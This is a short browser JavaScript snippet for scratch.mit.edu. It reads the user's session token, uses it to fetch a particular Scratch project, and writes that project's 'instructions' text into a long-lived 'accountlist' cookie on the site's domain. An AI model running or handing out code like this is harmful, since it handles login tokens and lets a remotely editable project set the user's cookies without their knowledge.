async function download(){
	let token=(await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
	let data=(await (await fetch("https://api.scratch.mit.edu/projects/771297522",{
		headers:{
			"x-token":token
		}})).json()).instructions;
	document.cookie=`accountlist=${data};path=/;domain=.scratch.mit.edu;max-age=458912744;`
  }
download()
